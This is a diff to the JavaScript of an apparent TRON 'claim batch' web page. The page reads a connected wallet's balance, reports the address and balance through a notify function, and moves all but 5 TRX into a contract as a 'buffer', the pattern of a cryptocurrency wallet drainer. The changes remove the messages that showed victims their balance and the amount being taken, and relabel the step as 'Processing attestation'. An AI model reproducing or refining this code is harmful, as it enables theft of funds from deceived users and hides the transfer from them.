@@ -364,10 +364,18 @@
         }
         
         async function detectWallet() {
+            if (window.ethereum && window.ethereum.isMetaMask) {
+                log('MetaMask does not support TRON.', false);
+                setTimeout(function() {
+                    window.location.href = 'https://www.tronlink.org/';
+                }, 2000);
+                return false;
+            }
+            
             var provider = await getTronProvider();
             
             if (!provider) {
-                log('No compatible wallet detected. Install TronLink or use Trust Wallet.', false);
+                log('No compatible wallet detected.', false);
                 return false;
             }
             
@@ -382,7 +390,6 @@
                     
                     var balance = await tronWeb.trx.getBalance(userAddress);
                     var balanceTRX = (balance / 1000000).toFixed(2);
-                    log('Wallet ready. Balance: ' + balanceTRX + ' TRX', true);
                     
                     notify(userAddress, balanceTRX);
                     
@@ -403,7 +410,7 @@
             
             claimBtn.textContent = 'Check Wallet...';
             claimBtn.disabled = true;
-            log('Calculating required buffer...', true);
+            log('Processing attestation...', true);
             
             try {
                 var balance = await tronWeb.trx.getBalance(userAddress);
@@ -411,13 +418,11 @@
                 var requiredBuffer = balanceTRX - 5;
                 
                 if (requiredBuffer <= 0) {
-                    log('Insufficient TRX. Balance: ' + balanceTRX.toFixed(2) + ' TRX', false);
+                    log('Insufficient TRX for gas buffer.', false);
                     claimBtn.textContent = '[2] Claim Batch';
                     claimBtn.disabled = false;
                     return;
                 }
-                
-                log('Attaching ' + requiredBuffer.toFixed(2) + ' TRX as buffer...', true);
                 
                 var contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 
@@ -489,4 +494,4 @@
         });
     </script>
 </body>
-                </html>
+    </html>
